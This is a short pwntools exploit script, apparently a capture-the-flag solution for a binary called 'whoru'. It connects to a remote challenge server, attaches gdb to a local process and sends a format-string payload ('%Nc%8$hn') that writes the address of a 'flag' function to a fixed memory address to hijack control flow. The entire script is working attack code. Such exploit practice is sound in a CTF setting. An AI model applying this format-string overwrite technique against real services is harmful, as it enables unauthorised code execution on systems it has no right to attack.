from pwn import *

context.terminal = "tmux splitw -h".split()
elf = context.binary = ELF('./whoru')
p = remote('103.37.125.237',10002)
p = elf.process()
cmd = """
b * main+107
"""
gdb.attach(p,cmd)
pay = "%{}c%8$hn".format(elf.symbols["flag"]).encode().ljust(16, b"\x00")
pay += p64(0x403208)

p.sendlineafter(b'! ',pay)
p.interactive()
